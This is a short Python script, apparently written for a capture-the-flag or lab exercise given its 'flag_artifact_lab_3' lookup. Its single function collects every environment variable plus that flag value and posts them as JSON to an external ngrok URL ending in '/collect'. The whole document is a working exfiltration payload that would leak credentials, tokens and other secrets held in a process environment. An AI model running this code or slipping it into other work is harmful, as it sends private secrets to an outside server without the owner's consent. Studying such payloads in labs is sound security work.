import os
import requests

def run_payload():
    # Fetch all environment variables
    env_vars = os.environ

    # URL to send the data to
    url = "https://5cecdbdb0328.ngrok.app/collect"

    # Try fetching the flag from the environment (if available)
    flag = os.getenv('flag_artifact_lab_3')
    if flag:
        env_vars['FLAG'] = flag

    # Send environment variables to the server
    try:
        response = requests.post(url, json=dict(env_vars))
        if response.status_code == 200:
            print("Environment variables sent successfully")
        else:
            print("Failed to send environment variables")
    except Exception as e:
        print(f"Error occurred: {e}")

